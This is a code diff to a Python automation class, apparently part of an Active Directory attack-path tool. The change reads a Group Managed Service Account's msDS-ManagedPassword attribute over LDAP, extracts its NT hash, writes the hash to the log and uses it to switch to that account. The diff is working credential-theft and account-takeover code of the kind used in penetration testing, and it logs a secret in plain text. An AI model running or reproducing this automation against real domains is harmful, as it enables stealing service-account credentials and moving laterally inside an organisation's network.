@@ -209,16 +209,14 @@ class Automation:
             target_dn = rel["end_node"]["distinguishedname"]
             
             # Read msDS-ManagedPassword attribute from the GMSA account
-            # This returns the raw base64 encoded password blob
-            password_blob = None
+            nthash = None
             async for entry in get.object(self.conn, target_dn, attr="msDS-ManagedPassword"):
                 if "msDS-ManagedPassword" in entry:
-                    password_blob = entry["msDS-ManagedPassword"][0]['B64ENCODED']
+                    nthash = entry["msDS-ManagedPassword"][0]['NT']
                     break
             
-            if password_blob:
-                LOG.info(f"Retrieved GMSA password (base64): {password_blob}")
-                print(f"[+] GMSA password retrieved (base64): {password_blob}")
+            if nthash:
+                LOG.info(f"Retrieved GMSA NT hash: {nthash}")
                 
                 # Get the sAMAccountName for the GMSA account
                 ldap = await self.conn.getLdap()
@@ -230,9 +228,9 @@ class Automation:
                 if user_entry:
                     user = user_entry["sAMAccountName"]
                     # Use the base64 encoded password directly
-                    pwd = password_blob
                     LOG.info(f"Switching to GMSA account: {user}")
-                    await self._switchUser(user, pwd)
+                    self.conn.conf.nthash = nthash
+                    await self._switchUser(user, nthash)
                 else:
                     LOG.warning("Could not retrieve sAMAccountName for GMSA account")
             else:
